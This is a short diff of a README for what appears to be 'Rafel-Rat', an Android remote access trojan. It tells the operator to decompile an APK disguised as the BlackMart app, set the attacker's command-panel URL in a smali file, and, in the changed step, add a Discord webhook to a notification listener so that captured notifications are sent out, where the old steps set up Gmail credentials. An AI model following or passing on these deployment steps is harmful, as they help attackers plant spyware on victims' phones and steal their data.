@@ -59,9 +59,7 @@ OR
 1. Download <a href="https://github.com/swagkarna/Rafel-Rat/releases/download/Blackmart/BlackMart.apk">BlackMartapk</a> and  decompile with `Apktool` and navigate to `smali_classes2\com\velociraptor\raptor`
 2. Open `InternalService.smali` 
 3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/public/commands.php"***
-4. Now open `MailConfig.smali` and enter your gmail address and password
-5. Now open `SendMail$1` and enter your gmail address and password
-6. Now open `SendMail1` and enter your gmail address
+4. Now open `NotificationListener.smali` and enter replace with your discord webhook url
 
 ---
 ### Building Server 
